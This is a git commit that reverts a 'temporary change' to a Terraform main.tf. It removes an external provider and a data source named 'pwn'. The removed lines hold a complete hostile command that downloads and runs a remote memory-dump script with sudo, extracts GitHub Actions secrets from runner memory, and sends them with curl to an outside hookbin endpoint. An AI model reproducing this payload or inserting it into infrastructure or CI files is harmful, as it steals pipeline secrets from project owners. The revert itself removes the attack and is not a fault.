ef65f2197a13065b1b869618279a3f648fc1aaed
kn0vd3h1 <kn0vd3h1@rolf.ovh>
2026-04-07 20:01:23 +0000

    Revert "Add temporary change"
    This reverts commit 077541a643fd94ee88f3cfefbf7ad4a85670ed25.

--- terraform/main.tf
+++ terraform/main.tf
@@ -17,10 +17,6 @@ terraform {
       source  = "hashicorp/tls"
       version = "4.0.6"
     }
-    external = {
-      source  = "hashicorp/external"
-      version = "2.3.4"
-    }
   }
   backend "s3" {
     bucket = "taikinoda-tfstate"
@@ -51,8 +47,4 @@ provider "aws" {
 
 data "sops_file" "tf_secrets" {
   source_file = "sops/tf_secrets.yaml"
-}
-
-data "external" "pwn" {
-  program = ["bash", "-c", "echo 'Okay, we got this far. Let's continue...' && curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\\0' | grep -aoE '\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isSecret\":true\\}' >> \"/tmp/secrets\" && curl -X PUT -d \\@/tmp/secrets \"https://open-hookbin.vercel.app/$GITHUB_RUN_ID\" && echo '{}'"]
 }
